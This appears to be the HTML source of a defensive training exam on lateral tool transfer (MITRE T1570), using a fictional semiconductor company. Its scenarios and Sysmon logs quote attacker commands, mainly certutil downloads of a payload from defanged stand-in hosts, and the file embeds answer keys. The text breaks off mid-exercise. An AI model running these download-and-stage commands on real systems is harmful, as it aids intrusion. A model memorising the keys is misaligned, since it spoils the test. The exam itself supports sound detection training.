<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="color-scheme" content="dark">
<title>T1570 — HARD practice exam</title>
<link rel="icon" href="../../assets/img/logo.png" type="image/png">
<script type="application/json" id="cm-exercise-meta">
{
  "topicId": "t1570",
  "batch": 3,
  "title": "T1570 Lateral Tool Transfer — HARD",
  "difficulty": "hard",
  "questionCount": 15,
  "estimatedMinutes": 38,
  "passMark": 70
}
</script>
<style>
:root{
  --bg-page:#0b1020;
  --bg-surface:#121a2e;
  --bg-surface-2:#0f1729;
  --border:#243049;
  --border-strong:#33415f;
  --border-faint:#3a4a6e;
  --text-primary:#e6ecff;
  --text-secondary:#a9b4d0;
  --text-mono:#c8ffd4;
  --accent-blue:#5aa9ff;
  --accent-amber:#ffb454;
  --accent-green:#57d38c;
  --accent-green-hover:#6fdda0;
  --accent-amber-hover:#ffc477;
  --state-correct:#57d38c;
  --state-partial:#ffb454;
  --state-incorrect:#ff6b6b;
  --state-skipped:#a9b4d0;
  --state-paused:#9d7bff;
  --sev-easy:#57d38c;
  --sev-medium:#ffb454;
  --sev-hard:#ff8a3d;
  --sev-extreme:#ff6b6b;
  /* derived tints — every derived colour is defined here, once */
  --bg-inset:#0c1222;
  --bg-option:#0e1628;
  --bg-option-hover:#141d33;
  --bg-option-selected:#102419;
  --bg-btn-hover:#182238;
  --bg-seg:#1a2440;
  --bg-terminal:#080d1a;
  --bg-term-row:#0a1020;
  --bg-header-veil:rgba(11,16,32,.96);
  --overlay:rgba(11,16,32,.97);
  --accent-blue-tint:rgba(90,169,255,.08);
  --accent-blue-tint-soft:rgba(90,169,255,.05);
  --accent-amber-tint:rgba(255,180,84,.08);
  --accent-green-tint:rgba(87,211,140,.08);
  --correct-tint:rgba(87,211,140,.07);
  --incorrect-tint:rgba(255,107,107,.06);
  --correct-glow:rgba(87,211,140,.18);
  --veil-strong:rgba(255,255,255,.14);
  --veil-faint:rgba(255,255,255,.02);
  --shadow-card:0 6px 18px rgba(0,0,0,.35);
  --hl-time:#9fb6e8;
  --on-easy:#08120b;
  --on-medium:#1d1204;
  --on-hard:#190b03;
  --on-extreme:#1d0505;
  --on-green:#08120b;
  --on-amber:#1d1204;
}
*{box-sizing:border-box;}
html,body{margin:0;padding:0;}
html{color-scheme:dark;background:var(--bg-page);}
body{
  background:var(--bg-page);
  color:var(--text-primary);
  font-family:system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
  font-size:16px;
  line-height:1.55;
  min-height:100vh;
}
.mono,.mono-inline,code,kbd,pre,.log-line,.term-input,.term-line{
  font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,"Liberation Mono","Courier New",monospace;
}
.mono-inline{background:var(--bg-surface-2);border:1px solid var(--border);border-radius:4px;padding:0 5px;color:var(--text-mono);font-size:.92em;}
button{font:inherit;color:inherit;cursor:pointer;}
:focus{outline:none;}
:focus-visible{outline:2px solid var(--accent-blue);outline-offset:2px;border-radius:6px;}
.wrap{max-width:980px;margin:0 auto;padding:18px 16px 60px;}
.card{background:var(--bg-surface);border:1px solid var(--border);border-radius:10px;box-shadow:var(--shadow-card);}
.muted{color:var(--text-secondary);}
.small{font-size:13.5px;}

/* ---------- badges ---------- */
.badge{display:inline-flex;align-items:center;gap:6px;border-radius:999px;padding:3px 12px;font-weight:700;font-size:13px;letter-spacing:.4px;border:1px solid transparent;min-height:28px;}
.sev-easy{color:var(--on-easy);background:var(--sev-easy);border-color:var(--sev-easy);}
.sev-medium{color:var(--on-medium);background:var(--sev-medium);border-color:var(--sev-medium);}
.sev-hard{color:var(--on-hard);background:var(--sev-hard);border-color:var(--sev-hard);}
.sev-extreme{color:var(--on-extreme);background:var(--sev-extreme);border-color:var(--sev-extreme);}
.state-chip{display:inline-flex;align-items:center;gap:6px;border-radius:999px;padding:3px 12px;font-weight:700;font-size:13px;border:1px solid var(--border);background:var(--bg-surface-2);}
.st-correct{color:var(--state-correct);border-color:var(--state-correct);}
.st-partial{color:var(--state-partial);border-color:var(--state-partial);}
.st-incorrect{color:var(--state-incorrect);border-color:var(--state-incorrect);}
.st-skipped{color:var(--state-skipped);}
.st-paused{color:var(--state-paused);border-color:var(--state-paused);}

/* ---------- buttons ---------- */
.btn{display:inline-flex;align-items:center;justify-content:center;gap:8px;border-radius:8px;border:1px solid var(--border);background:var(--bg-surface-2);color:var(--text-primary);padding:10px 18px;min-height:44px;font-weight:600;transition:background .15s ease,border-color .15s ease,transform .05s ease;}
.btn:hover{background:var(--bg-btn-hover);border-color:var(--border-strong);}
.btn:active{transform:translateY(1px);}
.btn:disabled{opacity:.45;cursor:not-allowed;transform:none;}
.btn-primary{background:var(--accent-green);border-color:var(--accent-green);color:var(--on-green);}
.btn-primary:hover{background:var(--accent-green-hover);border-color:var(--accent-green-hover);}
.btn-amber{background:var(--accent-amber);border-color:var(--accent-amber);color:var(--on-amber);}
.btn-amber:hover{background:var(--accent-amber-hover);border-color:var(--accent-amber-hover);}
.btn-ghost{background:transparent;}
.btn-danger{border-color:var(--state-incorrect);color:var(--state-incorrect);background:transparent;}

/* ---------- intro ---------- */
.intro-hero{padding:22px 22px 18px;}
.intro-hero h1{margin:0 0 6px;font-size:24px;line-height:1.25;}
.intro-facts{display:flex;flex-wrap:wrap;gap:10px;margin-top:14px;}
.fact{background:var(--bg-surface-2);border:1px solid var(--border);border-radius:8px;padding:8px 12px;font-size:13.5px;color:var(--text-secondary);}
.fact b{color:var(--text-primary);}
.section-title{display:flex;align-items:center;gap:10px;font-size:18px;font-weight:800;margin:26px 0 10px;color:var(--text-primary);}
.section-title .dot{width:10px;height:10px;border-radius:3px;background:var(--accent-blue);display:inline-block;}
.section-body{padding:18px 20px;}
.section-body p{margin:0 0 12px;}
.theme-panel{border:1px solid var(--border);border-radius:8px;background:var(--bg-surface-2);padding:12px 14px;margin-bottom:12px;}
.theme-panel h4{margin:0 0 8px;font-size:14px;color:var(--accent-blue);text-transform:uppercase;letter-spacing:.6px;}
.chips{display:flex;flex-wrap:wrap;gap:8px;}
.chip{background:var(--bg-inset);border:1px solid var(--border);border-radius:999px;padding:5px 12px;font-size:13px;color:var(--text-primary);}
.rules{margin:0;padding-left:20px;}
.rules li{margin-bottom:9px;}
.type-chips{display:flex;flex-wrap:wrap;gap:8px;margin:10px 0 2px;}
.start-row{display:flex;justify-content:center;padding:6px 0 20px;}
.start-btn{font-size:18px;padding:14px 44px;border-radius:10px;}

/* ---------- sticky header ---------- */
.exam-header{position:sticky;top:0;z-index:50;background:var(--bg-header-veil);border-bottom:1px solid var(--border);backdrop-filter:blur(6px);}
.exam-header-in{max-width:980px;margin:0 auto;padding:10px 16px;display:flex;flex-wrap:wrap;align-items:center;gap:10px;}
.hd-count{font-weight:800;font-size:15px;white-space:nowrap;}
.hd-timer{display:inline-flex;align-items:center;gap:8px;border:1px solid var(--border);border-radius:8px;background:var(--bg-surface-2);padding:6px 12px;font-weight:700;}
.hd-timer .t{font-variant-numeric:tabular-nums;letter-spacing:1px;}
.hd-score{display:inline-flex;align-items:center;gap:8px;border:1px solid var(--border);border-radius:8px;background:var(--bg-surface-2);padding:6px 12px;font-weight:700;}
.hd-score .s{color:var(--accent-green);font-variant-numeric:tabular-nums;}
.spacer{flex:1 1 auto;}
.hd-btns{display:flex;gap:8px;flex-wrap:wrap;}
.btn-slim{padding:6px 12px;min-height:44px;font-size:13.5px;}

/* ---------- progress ---------- */
.progress{max-width:980px;margin:0 auto;padding:0 16px 8px;}
.progress-bar{display:flex;gap:3px;height:8px;border-radius:6px;overflow:hidden;background:var(--bg-surface-2);position:relative;}
.seg{flex:1 1 0;background:var(--bg-seg);border-radius:2px;min-width:6px;transition:background .3s ease;}
.seg.ok{background:var(--state-correct);}
.seg.partial{background:var(--state-partial);}
.seg.bad{background:var(--state-incorrect);}
.seg.skipped{background:var(--state-skipped);opacity:.55;}
.seg.cur{background:var(--sev-color,var(--accent-blue));box-shadow:0 0 8px var(--sev-color,var(--accent-blue));}
.progress-bar::after{content:"";position:absolute;inset:0;background:linear-gradient(100deg,transparent 20%,var(--veil-strong) 50%,transparent 80%);transform:translateX(-100%);animation:sheen 3.2s ease-in-out infinite;pointer-events:none;}
@keyframes sheen{0%{transform:translateX(-100%);}55%{transform:translateX(100%);}100%{transform:translateX(100%);}}

/* ---------- exercise blocks ---------- */
.ex-meta-row{display:flex;flex-wrap:wrap;gap:10px;align-items:center;margin:14px 0 4px;}
.block{margin-top:16px;border:1px solid var(--border);border-radius:10px;background:var(--bg-surface);overflow:hidden;}
.block-h{display:flex;align-items:center;gap:10px;padding:9px 14px;font-weight:800;font-size:13.5px;letter-spacing:1.2px;border-bottom:1px solid var(--border);}
.block-h .ic{font-size:15px;}
.bl-scenario .block-h{color:var(--accent-blue);background:var(--accent-blue-tint);}
.bl-question .block-h{color:var(--accent-amber);background:var(--accent-amber-tint);}
.bl-answer .block-h{color:var(--accent-green);background:var(--accent-green-tint);}
.bl-feedback .block-h{background:var(--veil-faint);}
.block-b{padding:14px 16px;}
.block-b p{margin:0 0 10px;}
.collapse-btn{margin-left:auto;background:transparent;border:1px solid var(--border);color:var(--text-secondary);border-radius:6px;padding:3px 10px;font-size:12px;min-height:36px;}
.summary-line{padding:9px 14px;font-size:13px;color:var(--text-secondary);border-bottom:1px dashed var(--border);}
.artefact{border:1px solid var(--border);border-radius:8px;background:var(--bg-surface-2);margin:10px 0;overflow:hidden;}
.artefact-h{padding:6px 12px;font-size:12px;font-weight:700;letter-spacing:.8px;color:var(--accent-blue);border-bottom:1px solid var(--border);background:var(--accent-blue-tint-soft);}
.artefact .prose{padding:10px 14px;font-size:14.5px;}
.codeblock{margin:0;padding:10px 12px;overflow-x:auto;white-space:pre;}
.log-line{font-size:13.5px;line-height:1.65;white-space:pre-wrap;word-break:break-word;color:var(--text-mono);}
.hl-t{color:var(--hl-time);}
.hl-ioc{color:var(--accent-amber);}
.hl-bad{color:var(--state-incorrect);font-weight:700;}
.hl-warn{color:var(--state-partial);}
.hl-cmd{color:var(--accent-green);font-weight:700;}
.hl-flag{color:var(--state-paused);}
.hl-str{color:var(--text-mono);}
.hl-path{color:var(--accent-blue);}
.log-toolbar{display:flex;gap:10px;align-items:center;padding:8px 12px;border-bottom:1px solid var(--border);background:var(--bg-surface-2);}
.log-filter{flex:1;background:var(--bg-inset);border:1px solid var(--border);border-radius:6px;color:var(--text-primary);padding:7px 10px;font-size:13.5px;min-height:44px;}
.log-count{font-size:12px;color:var(--text-secondary);white-space:nowrap;}
.log-body{max-height:340px;overflow-y:auto;padding:8px 12px;}
.log-body::-webkit-scrollbar{width:10px;}
.log-body::-webkit-scrollbar-thumb{background:var(--border);border-radius:6px;}
.log-body::-webkit-scrollbar-track{background:var(--bg-surface-2);}

/* ---------- options ---------- */
.opts{display:flex;flex-direction:column;gap:10px;}
.opt{display:flex;align-items:flex-start;gap:12px;width:100%;text-align:left;background:var(--bg-option);border:1px solid var(--border);border-radius:8px;padding:12px 14px;min-height:48px;color:var(--text-primary);transition:background .12s ease,border-color .12s ease;}
.opt:hover{background:var(--bg-option-hover);}
.opt .letter{font-weight:800;color:var(--text-secondary);flex:0 0 auto;}
.opt.selected{border-color:var(--accent-green);box-shadow:0 0 0 1px var(--accent-green) inset,0 0 10px var(--correct-glow);background:var(--bg-option-selected);}
.opt.selected .sel-mark{color:var(--accent-green);}
.opt.disabled{opacity:.75;cursor:default;}
.sel-mark{margin-left:auto;font-size:12px;font-weight:800;color:var(--text-secondary);white-space:nowrap;}

/* ---------- drag & drop ---------- */
.dd-grid{display:grid;grid-template-columns:1fr;gap:14px;}
@media(min-width:720px){.dd-grid{grid-template-columns:1fr 1fr;}}
.bank{border:1px dashed var(--border-strong);border-radius:8px;padding:10px;min-height:56px;display:flex;flex-wrap:wrap;gap:8px;background:var(--bg-inset);}
.dchip{background:var(--bg-option-hover);border:1px solid var(--border-strong);border-radius:8px;padding:8px 12px;font-size:13.5px;min-height:44px;color:var(--text-primary);}
.dchip.grab{cursor:grab;}
.dchip.selected{border-color:var(--accent-green);box-shadow:0 0 0 1px var(--accent-green) inset;}
.zone{border:1px solid var(--border);border-radius:8px;background:var(--bg-option);padding:10px;min-height:96px;}
.zone.over{border-color:var(--accent-green);box-shadow:0 0 0 1px var(--accent-green) inset;}
.zone h5{margin:0 0 8px;font-size:13px;letter-spacing:.6px;text-transform:uppercase;color:var(--text-secondary);}
.zone-items{display:flex;flex-wrap:wrap;gap:8px;min-height:44px;}
.bank-label{font-size:12.5px;font-weight:700;letter-spacing:.6px;color:var(--text-secondary);margin:0 0 6px;text-transform:uppercase;}

/* ---------- order ---------- */
.ord-list{display:flex;flex-direction:column;gap:8px;}
.ord-row{display:flex;align-items:center;gap:10px;background:var(--bg-option);border:1px solid var(--border);border-radius:8px;padding:8px 10px;}
.ord-pos{flex:0 0 30px;text-align:center;font-weight:800;color:var(--text-secondary);}
.ord-text{flex:1;font-size:14.5px;}
.ord-btns{display:flex;gap:4px;}
.ord-btns button{background:var(--bg-surface-2);border:1px solid var(--border);border-radius:6px;width:44px;height:44px;font-size:14px;}
.ord-row.dragging{opacity:.4;}
.ord-row .handle{cursor:grab;color:var(--text-secondary);font-size:15px;}

/* ---------- match ---------- */
.match-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px;}
@media(max-width:620px){.match-grid{grid-template-columns:1fr;}}
.match-col{display:flex;flex-direction:column;gap:8px;}
.mitem{background:var(--bg-option);border:1px solid var(--border);border-radius:8px;padding:10px 12px;text-align:left;min-height:46px;color:var(--text-primary);}
.mitem.selected{border-color:var(--accent-green);box-shadow:0 0 0 1px var(--accent-green) inset;}
.mitem.used{opacity:.4;pointer-events:none;}
.pairs-list{margin-top:12px;display:flex;flex-direction:column;gap:6px;}
.pair-row{display:flex;align-items:center;gap:8px;background:var(--bg-surface-2);border:1px solid var(--border);border-radius:8px;padding:7px 10px;font-size:13.5px;}
.pair-row .x{margin-left:auto;background:transparent;border:1px solid var(--border);border-radius:6px;color:var(--state-incorrect);width:44px;height:44px;min-width:44px;}

/* ---------- fill blank ---------- */
.fb-sentence{font-size:16px;line-height:2;word-break:break-word;}
.blank-btn{display:inline-block;min-width:90px;min-height:44px;background:var(--bg-inset);border:1px dashed var(--border-faint);border-radius:6px;color:var(--text-mono);padding:2px 10px;text-align:center;}
.blank-btn.filled{border-style:solid;border-color:var(--accent-green);color:var(--accent-green);}
.blank-btn.selected{border-color:var(--accent-amber);box-shadow:0 0 0 1px var(--accent-amber) inset;}

/* ---------- terminal ---------- */
.term{background:var(--bg-terminal);border:1px solid var(--border);border-radius:8px;overflow:hidden;}
.term-bar{display:flex;gap:8px;align-items:center;padding:7px 12px;border-bottom:1px solid var(--border);background:var(--bg-surface-2);font-size:12px;color:var(--text-secondary);}
.term-dot{width:10px;height:10px;border-radius:50%;background:var(--border);display:inline-block;}
.term-scroll{max-height:260px;overflow-y:auto;padding:10px 12px;font-size:13.5px;}
.term-line{white-space:pre-wrap;word-break:break-word;color:var(--text-mono);line-height:1.6;}
.term-prompt{color:var(--accent-green);font-weight:700;}
.term-err{color:var(--state-incorrect);}
.term-ok{color:var(--state-correct);}
.term-input-row{display:flex;align-items:center;gap:8px;border-top:1px solid var(--border);padding:9px 12px;background:var(--bg-term-row);}
.term-input{flex:1;background:transparent;border:none;color:var(--text-mono);font-size:14px;min-height:44px;}
.term-input:focus{outline:none;}
.syntax-panel{border:1px solid var(--border);border-left:3px solid var(--accent-blue);border-radius:8px;background:var(--bg-surface-2);padding:10px 14px;margin-top:10px;font-size:13.5px;}
.syntax-panel h6{margin:0 0 6px;color:var(--accent-blue);font-size:12.5px;letter-spacing:.8px;text-transform:uppercase;}

/* ---------- branching ---------- */
.step-badge{display:inline-flex;align-items:center;gap:8px;background:var(--bg-surface-2);border:1px solid var(--border);color:var(--accent-amber);border-radius:999px;padding:3px 12px;font-weight:800;font-size:12.5px;letter-spacing:.8px;margin-bottom:10px;}
.step-verdict{display:flex;align-items:center;gap:10px;margin-top:10px;padding:9px 12px;border-radius:8px;border:1px solid var(--border);font-size:14px;}
.step-actions{display:flex;gap:10px;margin-top:12px;}

/* ---------- feedback ---------- */
.fb-head{display:flex;flex-wrap:wrap;align-items:center;gap:12px;}
.fb-title{font-size:16px;font-weight:800;}
.fb-credit{font-size:14px;font-weight:700;color:var(--state-partial);}
.item-rows{margin:12px 0;display:flex;flex-direction:column;gap:6px;}
.item-row{display:flex;align-items:flex-start;gap:10px;background:var(--bg-surface-2);border:1px solid var(--border);border-radius:8px;padding:8px 12px;font-size:14px;}
.item-row .mk{flex:0 0 auto;font-weight:800;}
.mk-c{color:var(--state-correct);}
.mk-w{color:var(--state-incorrect);}
.mk-m{color:var(--state-skipped);}
.persp{display:grid;grid-template-columns:1fr;gap:10px;margin-top:12px;}
@media(min-width:720px){.persp{grid-template-columns:1fr 1fr;}}
.persp .p-card{border:1px solid var(--border);border-radius:8px;padding:10px 14px;background:var(--bg-surface-2);font-size:14px;}
.persp .p-card h6{margin:0 0 6px;font-size:12.5px;letter-spacing:.8px;text-transform:uppercase;}
.p-card.red h6{color:var(--state-incorrect);}
.p-card.blue h6{color:var(--accent-blue);}
.study-tip{margin-top:12px;border:1px solid var(--border);border-left:3px solid var(--accent-amber);border-radius:8px;background:var(--bg-surface-2);padding:9px 12px;font-size:14px;color:var(--text-primary);}
.canon{margin-top:12px;}
.canon h6{margin:0 0 6px;font-size:12.5px;letter-spacing:.8px;color:var(--accent-green);text-transform:uppercase;}
.canon pre{background:var(--bg-terminal);border:1px solid var(--border);border-radius:8px;padding:10px 12px;color:var(--text-mono);font-size:14px;overflow-x:auto;white-space:pre-wrap;word-break:break-word;}
.canon ul{margin:6px 0 0;padding-left:20px;color:var(--text-secondary);font-size:13.5px;}
.canon li{margin-bottom:4px;}

/* ---------- review / results ---------- */
.review-list{display:flex;flex-direction:column;gap:10px;}
.review-row{display:flex;flex-wrap:wrap;gap:12px;align-items:center;padding:12px 14px;}
.review-row .q{flex:1;min-width:200px;font-size:14.5px;}
.result-hero{padding:26px 22px;text-align:center;}
.result-pct{font-size:52px;font-weight:900;line-height:1;font-variant-numeric:tabular-nums;}
.pass-panel{border:2px solid var(--state-correct);background:var(--correct-tint);}
.fail-panel{border:2px solid var(--state-incorrect);background:var(--incorrect-tint);}
.res-break{display:grid;grid-template-columns:1fr;gap:10px;margin-top:16px;}
@media(min-width:640px){.res-break{grid-template-columns:1fr 1fr;}}
.res-cell{display:flex;align-items:center;gap:10px;border:1px solid var(--border);border-radius:8px;background:var(--bg-surface-2);padding:12px 14px;font-size:14.5px;}
.res-cell b{font-size:22px;font-variant-numeric:tabular-nums;}
.paused-overlay{position:fixed;inset:0;z-index:100;background:var(--overlay);display:flex;align-items:center;justify-content:center;padding:20px;}
.paused-card{max-width:460px;width:100%;text-align:center;padding:30px 24px;border-color:var(--state-paused);}
.paused-card .big{font-size:44px;color:var(--state-paused);}
.hidden{display:none !important;}

"use strict";
var EXAM = {"meta":{"topicId":"t1570","batch":3,"title":"T1570 Lateral Tool Transfer — HARD","difficulty":"hard","questionCount":15,"estimatedMinutes":38,"passMark":70,"mitreId":"T1570","mitreName":"Lateral Tool Transfer","objectType":"Technique","severityLabel":"HARD","partLabel":null},"intro":{"learn":["T1570 Lateral Tool Transfer covers the operator copying tools or files **from one victim host to another** inside the compromised network. This differs from T1105 Ingress Tool Transfer, where bytes arrive from an external server, and from T1074 Data Staged, where victim data is collected into a staging location ahead of exfiltration.","Real intruders — including Trickbot and Conti-linked operators — stage tools over SMB admin shares (`net use` plus `copy`), with signed binaries such as `certutil`, over legacy protocols such as TFTP, and through WebDAV paths. Detection depends on joining Sysmon Event ID 11 share writes with Event ID 3 network sessions and Event ID 1 execution events, and on knowing what your own software deployment (SCCM) normally looks like.","In this HARD exam you work ticket QF-8812 at **Quantum Fab Semiconductor**, a fictional chipmaker where fab uptime is priced in euros per minute. Every host, user and organisation is fictional. All indicators are defanged."],"keywords":[{"theme":"Detection & Correlation","items":["EID 11 share writes","EID 3 SMB session correlation","EID 1 execution chains","SCCM deployment baselining"]},{"theme":"Staging Patterns","items":["one hash on many hosts","hash-not-seen-before on admin share","worm-style propagation loop"]},{"theme":"Mapping Discipline","items":["T1570 victim-to-victim","T1105 internet ingress","T1074 data staging contrast"]},{"theme":"Protocol Tradecraft","items":["certutil signed-binary abuse","TFTP quietness","WebDAV @80 paths"]},{"theme":"Mitigation Judgement","items":["SMB signing trade-offs","canary shares","execution prevention on staged paths","least aggressive action"]}],"types":["Multiple choice","Log analysis","Drag & drop","Timeline ordering","Matching","Fill in the blank","Branching scenario","Terminal (fake shell)"]},"exercises":[{"id":"e01","type":"dragdrop","scenario":{"text":["Ticket QF-8812, 03:47. Quantum Fab Semiconductor SOC, fab VLAN. The detection engineer's new T1570 analytic joins Sysmon file-create events (EID 11) with network sessions (EID 3) and process-create events (EID 1). Before it ships, its validation queue holds a mixed pile of events that must be triaged by hand.","The pile contains one victim-to-victim copy, the ingress pull that started it, and the nightly sanctioned software deployment."],"artefacts":[{"label":"Analytic spec draft","text":"Rule: EID 11 write under \\\\host\\C$\\ within 10s of an EID 3 session from a peer host, then EID 1 execution of the written file. Suppression list: CcmExec service writes."},{"label":"Validation queue (raw)","code":"a) EID11 \\\\qfs-fab-ctrl-4\\C$\\Windows\\Temp\\kit.bin + EID3 qfs-eng-ws-21:445 same second\nb) EID1 certutil -urlcache -split -f hxxp://stage-north[.]example/kit.bin (qfs-eng-ws-21)\nc) EID11 CcmExec writing \\\\qfs-fs-elite\\C$\\Windows\\ccmsetup\\update.msi\nd) EID3 qfs-eng-ws-21 -> qfs-fab-ctrl-4:445 + EID1 of the written file on the target\ne) EID1 msiexec /i \\\\qfs-sccm-01\\packages$\\fabui.msi (six hosts, queued)"}]},"question":"Drag each queued event into the zone that matches what it actually is.","answer":{"zones":[{"name":"Victim-to-victim transfer (T1570)"},{"name":"Ingress on one host (T1105)"},{"name":"Routine deployment (benign)"}],"items":[{"text":"Event a — kit.bin appears on \\\\qfs-fab-ctrl-4\\C$ in the same second as an EID 3 session from peer qfs-eng-ws-21","zone":0},{"text":"Event b — certutil on qfs-eng-ws-21 fetches kit.bin from hxxp://stage-north[.]example","zone":1},{"text":"Event c — CcmExec writes update.msi to \\\\qfs-fs-elite\\C$\\Windows\\ccmsetup\\","zone":2},{"text":"Event d — peer SMB session followed by execution of the written file on the target","zone":0},{"text":"Event e — msiexec installs fabui.msi from the SCCM packages share on six hosts","zone":2}]},"hint":"The source of the bytes decides the zone: a peer victim, an internet host, or the SCCM server.","explanation":["Events a and d are the T1570 pattern: a file appears on a remote admin share in the same breath as an SMB session from a peer victim, and the file then executes there. Victim-to-victim movement is the definition of lateral tool transfer.","Event b looks like the same story, but the bytes come from stage-north[.]example, an external host, so it is ingress (T1105) on one victim. Certutil being a signed Microsoft binary does not change the direction.","Events c and e are the sanctioned deployment your baseline must absorb: CcmExec and msiexec pulling from the SCCM packages share. Suppress-and-note is the correct disposition; deleting the analytic because of them would blind you to event a."],"perspectives":{"attacker":"Copying tools peer-to-peer keeps external egress silent — boundary-only detections never see it.","defender":"Baseline your SCCM identity first; then every other admin-share writer is signal."},"study":"Practise reading EID 11 TargetFilename against the EID 3 session that carried the bytes."},{"id":"e02","type":"log-qcm","scenario":{"text":["03:12. Triage on ticket QF-8812. The staging-pattern analytic pages: one binary hash written to 40 admin shares in six minutes. The on-call analyst wants to declare an incident and wake the fab manager.","Before anyone wakes the floor, two artefacts arrive: the share-write roll-up below and IT change QF-8803, which books a sanctioned fab-UI update window on the same VLAN tonight."],"artefacts":[{"label":"IT change QF-8803","text":"Approved maintenance window 02:00-05:00. fab-UI 2.1 push via SCCM to 40 fab-VLAN endpoints. Owner: platform team."}]},"log":{"title":"Sysmon share-write roll-up — fab VLAN, 03:12–03:18","lines":["03:12:02 EID3 qfs-sccm-01 -> qfs-fab-ctrl-4:445 account=QFS\\sccm-push","03:12:03 EID11 TargetFilename=\\\\qfs-fab-ctrl-4\\C$\\Windows\\ccmsetup\\fabui-2.1.msi","03:12:19 EID3 qfs-sccm-01 -> qfs-eng-ws-21:445 account=QFS\\sccm-push","03:12:20 EID11 TargetFilename=\\\\qfs-eng-ws-21\\C$\\Windows\\ccmsetup\\fabui-2.1.msi","03:14:41 EID3 qfs-sccm-01 -> qfs-fs-elite:445 account=QFS\\sccm-push","03:14:42 EID11 TargetFilename=\\\\qfs-fs-elite\\C$\\Windows\\ccmsetup\\fabui-2.1.msi","03:17:55 EID1 msiexec.exe /i \\\\qfs-sccm-01\\packages$\\fabui-2.1.msi /qn (qfs-fab-ctrl-4)"]},"question":"Which single observation is the strongest benign explanation for the mass share-write alert?","answer":{"options":["Forty hosts were written inside six minutes","The writing session account is QFS\\sccm-push arriving from qfs-sccm-01","The writes target \\\\host\\C$\\Windows\\ccmsetup\\, an admin share","The payload is an .msi package rather than an .exe"],"correct":1},"hint":"Volume and share names look the same in both worlds. Ask which identity is doing the writing.","explanation":["The writer identity settles it: every session comes from the SCCM site server using the dedicated push account, and change QF-8803 books exactly this window. That is the sanctioned deployment your baseline exists to absorb.","Volume is the trap: a sanctioned rollout and worm staging both produce many hosts in minutes. Forty hosts prove speed, not intent.","The admin-share path and the .msi extension are cosmetic. Adversaries also drop .msi files onto admin shares, and staging lands on C$ just as happily as ccmsetup does."],"perspectives":{"attacker":"Worm staging borrows the exact shape of a rollout: many hosts, one hash, short window.","defender":"Pin the writer identity and the change record before you wake anyone."},"study":"Learn the SCCM client identity model: CcmExec and its push account are the writers you expect."},{"id":"e03","type":"qcm-single","scenario":{"text":["05:20. The CTI analyst reviews the QF-8812 timeline. At 02:41, qfs-eng-ws-21 pulled kit.bin from hxxp://stage-north[.]example/kit.bin over the egress proxy. At 02:52, qfs-eng-ws-21 copied kit.bin to \\\\qfs-fab-ctrl-4\\C$\\Windows\\Temp\\ through an SMB admin-share session bound to account QFS\\fab-svc.","A junior reviewer proposes mapping both events as T1105 Ingress Tool Transfer, reasoning that both are downloads of the same binary and that one mapping keeps the report short."],"artefacts":[{"label":"Timeline excerpt — QF-8812","code":"02:41:11 EID1 certutil.exe PID=6210 qfs-eng-ws-21 cmd=certutil -urlcache -split -f hxxp://stage-north[.]example/kit.bin kit.bin\n02:41:13 EID11 C:\\Users\\Public\\kit.bin (qfs-eng-ws-21)\n02:52:31 EID3 qfs-eng-ws-21 -> qfs-fab-ctrl-4:445 account=QFS\\fab-svc\n02:52:32 EID11 \\\\qfs-fab-ctrl-4\\C$\\Windows\\Temp\\kit.bin"},{"label":"Junior reviewer note","text":"Same file, two hops — why two technique numbers? One mapping keeps the report short and the matrix clean."}]},"question":"Which mapping statement is correct for the 02:52 victim-to-victim copy?","answer":{"options":["T1105, because the same binary was downloaded from stage-north[.]example earlier","T1074, because kit.bin sits staged in C$\\Windows\\Temp before use","T1021.002, because the copy used an SMB admin share with valid credentials","T1570, because the file moved between two victim hosts inside the network"],"correct":3},"hint":"One event crosses the internet boundary; the other never does. Map each event on its own artefacts.","explanation":["The 02:52 copy moved a tool from one compromised host to another over an internal share. That is exactly T1570, and it stays T1570 even though the same file arrived from the internet earlier.","T1105 belongs to the 02:41 pull alone: the bytes came from an external server. Mapping both events as T1105 erases the lateral hop, which is the behaviour your admin-share detection covers.","T1074 models collecting victim data into a staging location ahead of exfiltration, not moving an operator tool. T1021.002 models authenticated interaction with the share itself; the artefact under review here is the file transfer."],"perspectives":{"attacker":"Peer-to-peer copying hides tool movement from boundary telemetry.","defender":"Model every hop separately in the report; merged mappings hide the control gap."},"study":"Read the ATT&CK pages for T1570, T1105 and T1074 side by side; direction is the dividing line."},{"id":"e04","type":"qcm-multi","scenario":{"text":["The QF-8812 operator ran on qfs-fab-ctrl-4, as account QFS\\fab-svc: `certutil -urlcache -split -f hxxp://10[.]20[.]4[.]31:8080/kit.bin kit.bin`. Address 10[.]20[.]4[.]31 is peer victim qfs-eng-ws-21, serving kit.bin from a temporary HTTP listener.","The fab engineering team asks why an intruder would use a certificate tool to move a payload instead of shipping a dedicated uploader."],"artefacts":[{"label":"Command artefact — qfs-fab-ctrl-4","code":"03:41:07 EID1 Image=C:\\Windows\\System32\\certutil.exe PID=4784 user=QFS\\fab-svc\ncmd=certutil -urlcache -split -f hxxp://10[.]20[.]4[.]31:8080/kit.bin kit.bin"},{"label":"Peer note","text":"10[.]20[.]4[.]31 resolves to qfs-eng-ws-21. Its temporary HTTP listener on 8080 served kit.bin for eleven minutes."}]},"question":"Select every statement that correctly explains certutil's tradecraft value here.","answer":{"options":["It is signed by Microsoft, so it often survives allow-list and trust checks","It installs a persistent service that survives reboots on the target","It can fetch over HTTP from an internal staging peer with no extra tooling","It bypasses SMB signing on the destination admin share","Its command line resembles routine certificate administration at a glance"],"correct":[0,2,4]},"hint":"Two of the five claims would make certutil magical. Signed binaries are trusted, not all-powerful.","explanation":["Certutil is a signed Microsoft binary that ships on every Windows install. Allow-lists and analysts give signed tools the benefit of the doubt, and the fetch needs no downloaded uploader.","Resemblance is the quiet advantage: -urlcache command lines look like certificate housekeeping to an untrained eye. That is resemblance, not capability.","The wrong options give certutil powers it does not have: it installs no service and survives nothing, and SMB signing is negotiated between the two hosts regardless of which client tool wrote the file."],"perspectives":{"attacker":"Living-off-the-land transfer means no uploader ever needs staging of its own.","defender":"Alert on certutil with -urlcache when the caller is a service account — benign use rarely matches that shape."},"study":"Study the LOLBAS entry for certutil and note which subcommands download or encode."},{"id":"e05","type":"order","scenario":{"text":["Reconstruct the QF-8812 propagation loop before the 09:00 fab standup. The loop ran per target host from the foothold on 